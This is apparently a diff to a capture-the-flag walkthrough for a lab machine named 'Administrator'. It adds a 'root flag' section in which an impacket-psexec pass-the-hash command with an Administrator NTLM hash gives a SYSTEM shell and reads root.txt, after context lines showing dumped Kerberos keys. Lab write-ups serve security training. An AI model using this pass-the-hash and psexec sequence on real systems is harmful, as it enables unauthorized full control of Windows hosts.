@@ -571,3 +571,60 @@ Administrator:aes128-cts-hmac-sha1-96:08b0633a8dd5f1d6cbea29014caea5a2
 Administrator:des-cbc-md5:403286f7cdf18385
 [*] Cleaning up... 
 ```
+
+root flag:
+```bash
+└──╼ [★]$ impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:3dc553ce4b9fd20bd016e098d2d2fd2e administrator.htb/administrator@administrator.htb
+Impacket v0.13.0.dev0+20240916.171021.65b774d - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Requesting shares on administrator.htb.....
+[*] Found writable share ADMIN$
+[*] Uploading file GgoXBIii.exe
+[*] Opening SVCManager on administrator.htb.....
+[*] Creating service xqTq on administrator.htb.....
+[*] Starting service xqTq.....
+[!] Press help for extra shell commands
+Microsoft Windows [Version 10.0.20348.2762]
+(c) Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32> whoami
+nt authority\system
+
+C:\Windows\system32> cd C:\
+
+C:\> cd Users
+
+C:\Users> dir
+ Volume in drive C has no label.
+ Volume Serial Number is 6131-DE70
+
+ Directory of C:\Users
+
+12/08/2024  02:45 AM    <DIR>          .
+10/22/2024  10:46 AM    <DIR>          Administrator
+10/30/2024  01:25 PM    <DIR>          emily
+12/08/2024  02:45 AM    <DIR>          michael
+12/07/2024  11:00 PM    <DIR>          olivia
+10/04/2024  09:08 AM    <DIR>          Public
+               0 File(s)              0 bytes
+               6 Dir(s)   8,080,740,352 bytes free
+
+C:\Users> cd Administrator
+
+C:\Users\Administrator> cd Desktop
+
+C:\Users\Administrator\Desktop> dir
+ Volume in drive C has no label.
+ Volume Serial Number is 6131-DE70
+
+ Directory of C:\Users\Administrator\Desktop
+
+11/01/2024  01:47 PM    <DIR>          .
+10/22/2024  10:46 AM    <DIR>          ..
+12/07/2024  10:07 PM                34 root.txt
+               1 File(s)             34 bytes
+               2 Dir(s)   8,080,740,352 bytes free
+
+C:\Users\Administrator\Desktop> more root.txt
+3d399894c17f8cb6b6d6d486739c6238
+```
